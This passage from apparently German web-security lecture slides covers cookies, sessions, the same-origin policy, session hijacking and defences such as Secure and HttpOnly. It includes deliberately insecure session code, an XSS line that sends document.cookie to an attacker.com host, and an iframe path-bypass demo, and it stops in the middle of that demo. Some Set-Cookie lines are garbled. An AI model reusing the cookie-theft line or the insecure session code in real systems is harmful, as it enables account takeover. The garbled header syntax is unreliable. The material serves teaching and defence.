+        C-&gt;&gt;S: GET / HTTP/1.1&lt;br&gt;Cookie: username=alice, tag=t
+        Note right of S: V(k, 'alice', t) -&gt; ok? OK!
+        S-&gt;&gt;C: HTTP/1.1 200 OK&lt;br&gt;Private webpage for Alice
+    end
+</pre>
+</div>
+<p></p></figure><p></p>
+</div>
+</div>
+</div>
+</div><div class="column" style="width:38%;">
+<div class="fragment">
+<p><strong>1. Login</strong><br>
+Client sendet Zugangsdaten an den Server.</p>
+</div>
+<div class="fragment">
+<p><strong>2. Schlüssel erzeugen</strong><br>
+Server erzeugt geheimen Schlüssel <code>k</code> und prüft die Login-Daten.</p>
+</div>
+<div class="fragment">
+<p><strong>3. Signieren</strong><br>
+Server signiert den Usernamen: <code>S(k, 'alice') → t</code> und schickt beide Cookies zurück.</p>
+</div>
+<div class="fragment">
+<p><strong>4. Folge-Request</strong><br>
+Client sendet die Cookies bei jedem weiteren Aufruf mit.</p>
+</div>
+<div class="fragment">
+<p><strong>5. Verifizieren</strong><br>
+Server prüft die Signatur: <code>V(k, 'alice', t) → ok?</code> und liefert die private Seite.</p>
+</div>
+</div></div>
+</section>
+<section id="session-cookie-visualisierung-1" class="slide level2 content-slide code-slide">
+<h2>Session Cookie Visualisierung</h2>
+<div class="cell" data-reveal="true" data-layout-align="default">
+<div class="cell-output-display">
+<div>
+<p></p><figure class=""><p></p>
+<div>
+<pre class="mermaid mermaid-js">sequenceDiagram
+    participant C as Client
+    participant S as Server
+
+    C-&gt;&gt;S: POST /login HTTP/1.1&lt;br&gt;username=alice&amp;password=password
+    Note right of S: G() -&gt; k
+    Note right of S: Login info ok? OK!
+    Note right of S: S(k, 'alice') -&gt; t
+    S-&gt;&gt;C: HTTP/1.1 200 OK&lt;br&gt;Set-Cookie: username=alice&lt;br&gt;Set-Cookie: tag=t
+
+    loop Bei jedem weiteren Request
+        C-&gt;&gt;S: GET / HTTP/1.1&lt;br&gt;Cookie: username=alice, tag=t
+        Note right of S: V(k, 'alice', t) -&gt; ok? OK!
+        S-&gt;&gt;C: HTTP/1.1 200 OK&lt;br&gt;Private webpage for Alice
+    end
+</pre>
+</div>
+<p></p></figure><p></p>
+</div>
+</div>
+</div>
+</section>
+<section id="beispiel-unsichere-session-ii" class="slide level2 content-slide code-slide">
+<h2>Beispiel: Unsichere Session II</h2>
+<h3 id="javascript-i-1">JavaScript I</h3>
+<p><br></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb10"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb10-1"><a href=""></a> 1     const COOKIE_SECRET = 'G2T7SRHTX1T62DHR'</span>
+<span id="cb10-2"><a href=""></a> 2     app.use(cookieParser(COOKIE_SECRET))</span>
+<span id="cb10-3"><a href=""></a> 3</span>
+<span id="cb10-4"><a href=""></a> 4     app.get('/', (req, res) =&gt; {</span>
+<span id="cb10-5"><a href=""></a> 5         const { username } = req.signedCookies</span>
+<span id="cb10-6"><a href=""></a> 6         if (username) {</span>
+<span id="cb10-7"><a href=""></a> 7             res.send(`</span>
+<span id="cb10-8"><a href=""></a> 8                  <span class="dt">&lt;</span><span class="kw">h1</span><span class="dt">&gt;</span>Welcome, ${username}<span class="dt">&lt;/</span><span class="kw">h1</span><span class="dt">&gt;</span></span>
+<span id="cb10-9"><a href=""></a> 9                  <span class="dt">&lt;</span><span class="kw">p</span><span class="dt">&gt;</span>Your balance is $${BALANCES[username]}<span class="dt">&lt;/</span><span class="kw">p</span><span class="dt">&gt;</span></span>
+<span id="cb10-10"><a href=""></a>10                  `)</span>
+<span id="cb10-11"><a href=""></a>11         } else {</span>
+<span id="cb10-12"><a href=""></a>12             createReadStream('index.html').pipe(res)</span>
+<span id="cb10-13"><a href=""></a>13         }</span>
+<span id="cb10-14"><a href=""></a>14     })</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="beispiel-unsichere-session-ii-1" class="slide level2 content-slide code-slide">
+<h2>Beispiel: Unsichere Session II</h2>
+<h3 id="javascript-ii-1">JavaScript II</h3>
+<p><br></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb11"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb11-1"><a href=""></a>16     app.post('/login', (req, res) =&gt; {</span>
+<span id="cb11-2"><a href=""></a>17         const { username } = req.body</span>
+<span id="cb11-3"><a href=""></a>18         const { password } = req.body</span>
+<span id="cb11-4"><a href=""></a>19         if (password === USERS[username]) {</span>
+<span id="cb11-5"><a href=""></a>20             res.cookie('username', username, { signed: true })</span>
+<span id="cb11-6"><a href=""></a>21             res.redirect('/')</span>
+<span id="cb11-7"><a href=""></a>22         } else {</span>
+<span id="cb11-8"><a href=""></a>23             res.send('fail!')</span>
+<span id="cb11-9"><a href=""></a>24         }</span>
+<span id="cb11-10"><a href=""></a>25     })</span>
+<span id="cb11-11"><a href=""></a>26     app.get('/logout', (req, res) =&gt; {</span>
+<span id="cb11-12"><a href=""></a>27         res.clearCookie('username')</span>
+<span id="cb11-13"><a href=""></a>28         res.redirect('/')</span>
+<span id="cb11-14"><a href=""></a>29     })</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="beispiel-unsichere-session-iii" class="slide level2 content-slide code-slide">
+<h2>Beispiel: Unsichere Session III</h2>
+<h3 id="javascript-i-2">JavaScript I</h3>
+<p><br></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb12"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb12-1"><a href=""></a> 1     let nextSessionId = 1</span>
+<span id="cb12-2"><a href=""></a> 2     const SESSIONS = {} // sessionId -&gt; username</span>
+<span id="cb12-3"><a href=""></a> 3</span>
+<span id="cb12-4"><a href=""></a> 4     app.get('/', (req, res) =&gt; {</span>
+<span id="cb12-5"><a href=""></a> 5         const { sessionId } = req.cookies</span>
+<span id="cb12-6"><a href=""></a> 6         const username = SESSIONS[sessionId]</span>
+<span id="cb12-7"><a href=""></a> 7         if (username) {</span>
+<span id="cb12-8"><a href=""></a> 8             res.send(`</span>
+<span id="cb12-9"><a href=""></a> 9                  <span class="dt">&lt;</span><span class="kw">h1</span><span class="dt">&gt;</span>Welcome, ${username}<span class="dt">&lt;/</span><span class="kw">h1</span><span class="dt">&gt;</span></span>
+<span id="cb12-10"><a href=""></a>10                  <span class="dt">&lt;</span><span class="kw">p</span><span class="dt">&gt;</span>Your balance is $${BALANCES[username]}<span class="dt">&lt;/</span><span class="kw">p</span><span class="dt">&gt;</span></span>
+<span id="cb12-11"><a href=""></a>11                  `)</span>
+<span id="cb12-12"><a href=""></a>12         } else {</span>
+<span id="cb12-13"><a href=""></a>13             createReadStream('index.html').pipe(res)</span>
+<span id="cb12-14"><a href=""></a>14         }</span>
+<span id="cb12-15"><a href=""></a>15     })</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="beispiel-unsichere-session-iii-1" class="slide level2 content-slide code-slide">
+<h2>Beispiel: Unsichere Session III</h2>
+<h3 id="javascript-ii-2">JavaScript II</h3>
+<p><br></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb13"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb13-1"><a href=""></a>17     app.post('/login', (req, res) =&gt; {</span>
+<span id="cb13-2"><a href=""></a>18         const { username } = req.body</span>
+<span id="cb13-3"><a href=""></a>19         const { password } = req.body</span>
+<span id="cb13-4"><a href=""></a>20         if (password === USERS[username]) {</span>
+<span id="cb13-5"><a href=""></a>21             SESSIONS[nextSessionId] = username</span>
+<span id="cb13-6"><a href=""></a>22             res.cookie('sessionId', nextSessionId)</span>
+<span id="cb13-7"><a href=""></a>23             nextSessionId += 1</span>
+<span id="cb13-8"><a href=""></a>24             res.redirect('/')</span>
+<span id="cb13-9"><a href=""></a>25         } else {</span>
+<span id="cb13-10"><a href=""></a>26             res.send('fail!')</span>
+<span id="cb13-11"><a href=""></a>27         }</span>
+<span id="cb13-12"><a href=""></a>28     })</span>
+<span id="cb13-13"><a href=""></a>29     app.get('/logout', (req, res) =&gt; {</span>
+<span id="cb13-14"><a href=""></a>30         const { sessionId } = req.cookies</span>
+<span id="cb13-15"><a href=""></a>31         delete SESSIONS[sessionId]</span>
+<span id="cb13-16"><a href=""></a>32         res.clearCookie('username')</span>
+<span id="cb13-17"><a href=""></a>33         res.redirect('/')</span>
+<span id="cb13-18"><a href=""></a>34     })</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="beispiel-sichere-session" class="slide level2 content-slide code-slide">
+<h2>Beispiel: Sichere Session</h2>
+<h3 id="javascript-i-3">JavaScript I</h3>
+<p><br></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb14"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb14-1"><a href=""></a> 1     const { randomBytes } = require('crypto')</span>
+<span id="cb14-2"><a href=""></a> 2</span>
+<span id="cb14-3"><a href=""></a> 3     const SESSIONS = {} // sessionId -&gt; username</span>
+<span id="cb14-4"><a href=""></a> 4</span>
+<span id="cb14-5"><a href=""></a> 5     app.get('/', (req, res) =&gt; {</span>
+<span id="cb14-6"><a href=""></a> 6         const sessionId = req.cookies.sessionId</span>
+<span id="cb14-7"><a href=""></a> 7         const username = SESSIONS[sessionId]</span>
+<span id="cb14-8"><a href=""></a> 8         if (username) {</span>
+<span id="cb14-9"><a href=""></a> 9             res.send(`Hi ${username}. Your balance is $${BALANCES[username]}.`)</span>
+<span id="cb14-10"><a href=""></a>10         } else {</span>
+<span id="cb14-11"><a href=""></a>11             createReadStream('index.html').pipe(res)</span>
+<span id="cb14-12"><a href=""></a>12         }</span>
+<span id="cb14-13"><a href=""></a>13     })</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="beispiel-sichere-session-1" class="slide level2 content-slide code-slide">
+<h2>Beispiel: Sichere Session</h2>
+<h3 id="javascript-ii-3">JavaScript II</h3>
+<p><br></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb15"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb15-1"><a href=""></a>15     app.post('/login', (req, res) =&gt; {</span>
+<span id="cb15-2"><a href=""></a>16         const username = req.body.username</span>
+<span id="cb15-3"><a href=""></a>17         const password = USERS[username]</span>
+<span id="cb15-4"><a href=""></a>18         if (password === req.body.password) {</span>
+<span id="cb15-5"><a href=""></a>19             const sessionId = randomBytes(16).toString('hex')</span>
+<span id="cb15-6"><a href=""></a>20             SESSIONS[sessionId] = username</span>
+<span id="cb15-7"><a href=""></a>21             res.cookie('sessionId', sessionId)</span>
+<span id="cb15-8"><a href=""></a>22             res.redirect('/')</span>
+<span id="cb15-9"><a href=""></a>23         } else {</span>
+<span id="cb15-10"><a href=""></a>24             res.send('fail!')</span>
+<span id="cb15-11"><a href=""></a>25         }</span>
+<span id="cb15-12"><a href=""></a>26     })</span>
+<span id="cb15-13"><a href=""></a>27     app.get('/logout', (req, res) =&gt; {</span>
+<span id="cb15-14"><a href=""></a>28         const sessionId = req.cookies.sessionId</span>
+<span id="cb15-15"><a href=""></a>29         delete SESSIONS[sessionId]</span>
+<span id="cb15-16"><a href=""></a>30         res.clearCookie('sessionId')</span>
+<span id="cb15-17"><a href=""></a>31         res.redirect('/')</span>
+<span id="cb15-18"><a href=""></a>32     })</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="sessions-wünschenswerte-eigenschaften" class="slide level2 content-slide pdf-slide">
+<h2>Sessions: Wünschenswerte Eigenschaften</h2>
+<p><br></p>
+<ul>
+<li>Browser erinnert sich an Nutzer, so dass sich dieser nicht ständig neu einloggen muss</li>
+<li>Nutzer können den Session-Cookie nicht manipulieren, um sich als jemand anderes auszugeben</li>
+<li>Session-Cookies sind nicht ewig gültig</li>
+<li>Session-Cookies können auf dem Server gelöscht werden</li>
+<li>Session-Cookies sollten nach einer vorgegebenen Zeit ablaufen (z. B. 30 Tage)</li>
+</ul>
+</section>
+<section id="geschichte-der-cookies" class="slide level2 content-slide pdf-slide">
+<h2>Geschichte der Cookies</h2>
+<p><br></p>
+<h4 id="standardisierungsprozess">Standardisierungsprozess</h4>
+<ul>
+<li><strong>1994:</strong> Erste Implementierung in Netscape Navigator 0.9 Beta – beschrieben als vier Seiten Entwurfsdokument</li>
+<li><strong>1995:</strong> RFC 2109 Entwurf für einen (inkompatiblen) Standard</li>
+<li><strong>1997:</strong> RFC 2965 Versuch einer auf RFC 2109 basierenden Standardisierung. Wegen Inkombatibilität gescheitert.</li>
+<li><strong>2000:</strong> RFC 2964 Erneuter Versuch („Cookie2“). Wegen der gleichen Probleme gescheitert.</li>
+<li><strong>2011:</strong> RFC 6265 Erfolgreiche Standardisierung (Kompatibel zu Netscape Cookie Spezifikation) <br></li>
+</ul>
+<p>⇒ 17 Jahre bis zur Standardisierung !!! <br></p>
+<p>-Ad-hoc Entwicklung führte zu „interessanten“ Problemen</p>
+</section>
+<section id="wie-löscht-man-ein-cookie" class="slide level2 content-slide pdf-slide">
+<h2>Wie löscht man ein Cookie?</h2>
+<p><br></p>
+<ul>
+<li>Direktes Löschen des Cookies ist nicht möglich</li>
+<li>Cookie mit gleichem Namen und Pfad, aber Ablaufdatum in der Vergangenheit setzen</li>
+</ul>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb16"><pre class="sourceCode numberSource hmtl number-lines code-with-copy"><code class="sourceCode"><span id="cb16-1"><a href=""></a>extttSet − Cookie : key =; Expires = Thu, 01Jan197000 : 00 : 00GMT</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="grundlegende-cookie-attribute" class="slide level2 content-slide pdf-slide">
+<h2>Grundlegende Cookie-Attribute</h2>
+<p><br></p>
+<ul>
+<li><p><strong>Expires</strong> definiert das Ablaufdatum des Cookies. Ist das Datum nicht gesetzt, wird das Cookie beim Schließen des Browsers gelöscht.</p></li>
+<li><p><strong>Path</strong> schränkt das Cookie auf einen bestimmten Pfad-Prefix ein. Wird kein Pfad gesetzt, gilt das Cookie für die gesamte Domain.</p>
+<ul>
+<li>Beispiel: Path=/docs matcht /docs und /docs/web/</li>
+</ul></li>
+<li><p><strong>Domain</strong> definiert die Domain, für die das Cookie gültig ist. Ist kein Domain-Attribut gesetzt, gilt das Cookie nur für die aktuelle Domain.</p>
+<ul>
+<li>Ermöglicht das Setzen einer breiteren Domain (z.B. .example.com) von einer Subdomain(z.B. www.example.com)</li>
+<li><ol start="26" type="a">
+<li>B. informatik.htw-dresden.de kann Cookies für htw-dresden.de setzen</li>
+</ol></li>
+</ul></li>
+<li><p>Anmerkung: Path und Domain verletzen die Same-Origin-Policy</p>
+<ul>
+<li>Path nicht nutzen, um Cookies vor anderen Seiten der gleichen Domain zu schützen.</li>
+<li>Durch Nutzung von Domain können Cookies für andere Quelldomains gesetzt werden.</li>
+</ul></li>
+</ul>
+</section>
+<section id="cookies-von-javascript-auslesen" class="slide level2 content-slide code-slide">
+<h2>Cookies von JavaScript auslesen</h2>
+<p><br></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb17"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb17-1"><a href=""></a> 1     document.cookie = 'name=Lukas'</span>
+<span id="cb17-2"><a href=""></a> 2     document.cookie = 'favoriteFood=Cookies'</span>
+<span id="cb17-3"><a href=""></a> 3</span>
+<span id="cb17-4"><a href=""></a> 4     document.cookie</span>
+<span id="cb17-5"><a href=""></a> 5     // 'name=Lukas; favoriteFood=Cookies;'</span>
+<span id="cb17-6"><a href=""></a> 6</span>
+<span id="cb17-7"><a href=""></a> 7     document.cookie = 'name=; Expires=Thu, 01 Jan 1970 00:00:00 GMT'</span>
+<span id="cb17-8"><a href=""></a> 8</span>
+<span id="cb17-9"><a href=""></a> 9     document.cookie</span>
+<span id="cb17-10"><a href=""></a>10     // 'favoriteFood=Cookies;'</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="was-ist-ein-origin" class="slide level2 content-slide pdf-slide">
+<h2>Was ist ein Origin?</h2>
+<p><br></p>
+<div title="Definition: Origin">
+<div class="callout callout-note callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Definition: Origin</strong></p>
+</div>
+<div class="callout-content">
+<p>Ein <strong>Origin</strong> besteht aus drei Komponenten: 1. Protokoll (Schema): http oder https 2. Host (Domain): example.com 3. Port: 80, 443, 8080, …</p>
+</div>
+</div>
+</div>
+</div>
+<p><br></p>
+<div title="Beispiel">
+<div class="callout callout-tip callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Beispiel</strong></p>
+</div>
+<div class="callout-content">
+<p>https://www.example.com:443/path/page.html<br>
+Origin = https://www.example.com:443</p>
+</div>
+</div>
+</div>
+</div>
+</section>
+<section id="same-origin-policy-grundprinzip" class="slide level2 content-slide pdf-slide">
+<h2>Same-Origin-Policy – Grundprinzip</h2>
+<p><br></p>
+<div title="Kernregel">
+<div class="callout callout-important callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Kernregel</strong></p>
+</div>
+<div class="callout-content">
+<p>Scripts einer Webseite dürfen nur auf Ressourcen zugreifen, die vom selben Origin stammen.</p>
+</div>
+</div>
+</div>
+</div>
+<p><br></p>
+<ul>
+<li>Eingeführt in Netscape Navigator 2.0 (1995)</li>
+<li>Fundamentales Sicherheitskonzept im Web</li>
+<li>Verhindert, dass bösartige Seiten Daten von anderen Seiten stehlen <br></li>
+</ul>
+<div title="Ohne SOP wäre möglich:">
+<div class="callout callout-note callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Ohne SOP wäre möglich:</strong></p>
+</div>
+<div class="callout-content">
+<ul>
+<li>evil.com liest Ihre E-Mails von gmail.com</li>
+<li>evil.com führt Überweisungen auf bank.com durch</li>
+<li>evil.com liest Ihren Facebook-Feed</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+</section>
+<section id="origin-vergleich-beispiele" class="slide level2 content-slide pdf-slide">
+<h2>Origin-Vergleich – Beispiele</h2>
+<p><br></p>
+<p>Ausgangs-URL: https://www.example.com/page.html <br></p>
+<table class="caption-top">
+<colgroup>
+<col style="width: 33%">
+<col style="width: 33%">
+<col style="width: 33%">
+</colgroup>
+<thead>
+<tr class="header">
+<th>URL</th>
+<th>Gleicher Origin?</th>
+<th>Grund</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>https://www.example.com/other.html</td>
+<td>Ja</td>
+<td>Nur Pfad anders</td>
+</tr>
+<tr class="even">
+<td>https://www.example.com/dir/page.html</td>
+<td>Ja</td>
+<td>Nur Pfad anders</td>
+</tr>
+<tr class="odd">
+<td>http://www.example.com/page.html</td>
+<td>Nein</td>
+<td>Protokoll</td>
+</tr>
+<tr class="even">
+<td>https://example.com/page.html</td>
+<td>Nein</td>
+<td>Host (www fehlt)</td>
+</tr>
+<tr class="odd">
+<td>https://www.example.com:8080/page.html</td>
+<td>Nein</td>
+<td>Port</td>
+</tr>
+<tr class="even">
+<td>https://api.example.com/page.html</td>
+<td>Nein</td>
+<td>Host (Subdomain)</td>
+</tr>
+</tbody>
+</table>
+</section>
+<section id="was-kontrolliert-die-sop" class="slide level2 content-slide pdf-slide">
+<h2>Was kontrolliert die SOP?</h2>
+<p><br></p>
+<h4 id="dom-zugriff">DOM-Zugriff</h4>
+<ul>
+<li>Scripts können nur das DOM von Seiten des gleichen Origins lesen/manipulieren</li>
+</ul>
+<h4 id="xmlhttprequest-fetch-api">XMLHttpRequest / Fetch API</h4>
+<ul>
+<li>AJAX-Requests nur an den gleichen Origin (außer mit CORS)</li>
+</ul>
+<h4 id="web-storage">Web Storage</h4>
+<ul>
+<li>localStorage und sessionStorage sind origin-spezifisch</li>
+</ul>
+<h4 id="wichtig-cookies-folgen-nicht-der-sop">Wichtig: Cookies folgen NICHT der SOP!</h4>
+<ul>
+<li>Cookies haben ein eigenes, älteres Sicherheitsmodell:
+<ul>
+<li>Basiert auf Domain + Path (Port wird ignoriert!)</li>
+<li>Deshalb brauchen wir Secure, HttpOnly, SameSite</li>
+</ul></li>
+</ul>
+</section>
+<section id="sop-vs.-cookie-scoping" class="slide level2 content-slide pdf-slide">
+<h2>SOP vs.&nbsp;Cookie-Scoping</h2>
+<p><br></p>
+<div class="columns">
+<div class="column" style="width:50%;">
+<div title="Same-Origin-Policy">
+<div class="callout callout-note callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Same-Origin-Policy</strong></p>
+</div>
+<div class="callout-content">
+<ul>
+<li>Protokoll</li>
+<li>Host (exakt)</li>
+<li>Port</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+</div><div class="column" style="width:50%;">
+<div title="Cookie-Scoping">
+<div class="callout callout-note callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Cookie-Scoping</strong></p>
+</div>
+<div class="callout-content">
+<ul>
+<li>Domain (+ Subdomains)</li>
+<li>Path</li>
+<li>Port ignoriert!</li>
+</ul>
+<p>Cookie für .example.com<br>
+gilt auch für:<br>
+www.example.com api.example.com</p>
+</div>
+</div>
+</div>
+</div>
+</div></div>
+<div title="Konsequenz">
+<div class="callout callout-tip callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Konsequenz</strong></p>
+</div>
+<div class="callout-content">
+<p>Diese Diskrepanz ist Ursache vieler Sicherheitsprobleme!</p>
+</div>
+</div>
+</div>
+</div>
+</section>
+<section id="session-hijacking" class="slide level2 content-slide pdf-slide">
+<h2>Session Hijacking</h2>
+<p><br></p>
+<h4 id="unverschlüsselte-verbindung-als-angriffsziel">Unverschlüsselte Verbindung als Angriffsziel</h4>
+<ul>
+<li>Cookies über eine unverschlüsselte Verbindung übertragen ist eine sehr dumme Idee
+<ul>
+<li>Wenn ein Angreifer den Cookie sieht, kann er die Session des Nutzers übernehmen<br>
+</li>
+<li>Angreifer schickt den Cookie des Opfers, als wäre es sein eigener<br>
+</li>
+<li>Der Server kann den Unterschied nicht erkennen</li>
+</ul></li>
+</ul>
+</section>
+<section id="session-authentifizierung-ohne-angreifer" class="slide level2 content-slide code-slide">
+<h2>Session Authentifizierung ohne Angreifer</h2>
+<div class="columns">
+<div class="column" style="width:62%;">
+<div class="cell" data-reveal="true" data-layout-align="default">
+<div class="cell-output-display">
+<div>
+<p></p><figure class=""><p></p>
+<div>
+<pre class="mermaid mermaid-js">sequenceDiagram
+    participant C as Client
+    participant A as Attacker
+    participant S as Server
+
+    C-&gt;&gt;S: GET / HTTP/1.1&lt;br&gt;Cookie: sessionID=1234
+    Note over C,S: Angreifer liest die sessionID mit
+    A-&gt;&gt;S: GET / HTTP/1.1&lt;br&gt;Cookie: sessionID=1234
+    S-&gt;&gt;A: HTTP/1.1 200 OK&lt;br&gt;Private webpage!
+</pre>
+</div>
+<p></p></figure><p></p>
+</div>
+</div>
+</div>
+</div><div class="column" style="width:38%;">
+<div class="fragment">
+<p><strong>1. Legitimer Request</strong><br>
+Der Client sendet seinen Request mit der gültigen <code>sessionID=1234</code>.</p>
+</div>
+<div class="fragment">
+<p><strong>2. Abgreifen</strong><br>
+Der Angreifer schnappt sich die sessionID (z.B. per XSS oder Netzwerk-Sniffing).</p>
+</div>
+<div class="fragment">
+<p><strong>3. Identität übernehmen</strong><br>
+Der Angreifer schickt einen eigenen Request mit der <strong>gestohlenen</strong> sessionID.</p>
+</div>
+<div class="fragment">
+<p><strong>4. Voller Zugriff</strong><br>
+Der Server kann die beiden nicht unterscheiden und liefert die private Seite aus.</p>
+</div>
+</div></div>
+</section>
+<section id="firesheep-2010-gab-es-dafür-sogar-eine-firefox-erweiterung" class="slide level2 content-slide image-slide">
+<h2>Firesheep – 2010 gab es dafür sogar eine Firefox-Erweiterung</h2>
+<p><img src="../../images/firefox_erweiterung_1.jpg" style="height: 700px; width: 1100px"></p>
+</section>
+<section id="firesheep-2010-gab-es-dafür-sogar-eine-firefox-erweiterung-1" class="slide level2 content-slide image-slide">
+<h2>Firesheep – 2010 gab es dafür sogar eine Firefox-Erweiterung</h2>
+<p><img src="../../images/firefox_erweiterung_2.jpg" style="height: 700px; width: 1100px"></p>
+</section>
+<section id="firesheep-2010-gab-es-dafür-sogar-eine-firefox-erweiterung-2" class="slide level2 content-slide image-slide">
+<h2>Firesheep – 2010 gab es dafür sogar eine Firefox-Erweiterung</h2>
+<p><img src="../../images/firefox_erweiterung_3.jpg" style="height: 700px; width: 1100px"></p>
+</section>
+<section id="verteidigung" class="slide level2 content-slide code-slide">
+<h2>Verteidigung</h2>
+<p><br></p>
+<h4 id="https-verwenden">HTTPS verwenden</h4>
+<ul>
+<li>Das Secure-Attribut von Cookies nutzen. Dieses verhindert, dass Cookies über unverschlüsselte HTTP-Verbindungen übertragen werden.</li>
+</ul>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb18"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb18-1"><a href=""></a>Set-Cookie: key=value; Secure</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<ul>
+<li>Noch besser, ganze Website über HTTPS betreiben</li>
+</ul>
+</section>
+<section id="session-hijacking-mittels-cross-site-scripting-xss" class="slide level2 content-slide pdf-slide">
+<h2>Session Hijacking mittels Cross-Site Scripting (XSS)</h2>
+<p><br></p>
+<div title="Risiko">
+<div class="callout callout-important callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Risiko</strong></p>
+</div>
+<div class="callout-content">
+<ul>
+<li>Was wenn die Website anfällig für XSS ist?
+<ul>
+<li>Angreifer kann seinen Code in die Website einschleusen</li>
+<li>Code kann Cookies auslesen und an den Angreifer senden</li>
+</ul></li>
+</ul>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb19"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb19-1"><a href=""></a>new Image().src = "http://attacker.com/steal?cookie=" +</span>
+<span id="cb19-2"><a href=""></a>     document.cookie;</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<ul>
+<li>Mehr zu XSS folgt</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+<div title="Schutz">
+<div class="callout callout-tip callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Schutz</strong></p>
+</div>
+<div class="callout-content">
+<ul>
+<li>HttpOnly-Attribut von Cookies nutzen, das verhindert, dass Cookies über JavaScript gelesen werden können:</li>
+</ul>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb20"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb20-1"><a href=""></a>extttSet − Cookie : key = value; Secure; HttpOnly</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</div>
+</div>
+</div>
+</div>
+</section>
+<section id="cookie-path-bypass" class="slide level2 content-slide pdf-slide">
+<h2>Cookie Path Bypass</h2>
+<p><br></p>
+<ul>
+<li>Path-Attribut nicht für Security nutzen</li>
+<li>Path schützt nicht gegen unautorisiertes Lesen eines Cookies von einem anderen Pfad der gleichen Domain
+<ul>
+<li>Kann mittels eines &lt;iframe&gt; umgangen werden, in dem der Pfad des Cookies explizit angegeben wird</li>
+<li>Cookie im iframe kann mittels JavaScript ausgelesen werden: iframe.contentDocument.cookie</li>
+<li>Die Same-Origin-Policy erlaubt dies</li>
+</ul></li>
+</ul>
+<p>⇒ Path nur für Performance-Optimierung nutzen</p>
+</section>
+<section id="demo" class="slide level2 content-slide code-slide">
+<h2>Demo</h2>
+<p><br></p>
+<h4 id="opferseite">Opferseite</h4>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb21"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb21-1"><a href=""></a>document.cookie = 'sessionId=1234; Path=/class/programmierung/'</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<h4 id="angreiferseite">Angreiferseite</h4>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb22"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb22-1"><a href=""></a>const iframe = document.createElement('iframe')</span>
+<span id="cb22-2"><a href=""></a>iframe.src = 'https://lukas.ifflaender-family.de/class/programmierung/'</span>
+<span id="cb22-3"><a href=""></a>document.body.appendChild(iframe)</span>
+<span id="cb22-4"><a href=""></a>iframe.style.display = 'none'</span>
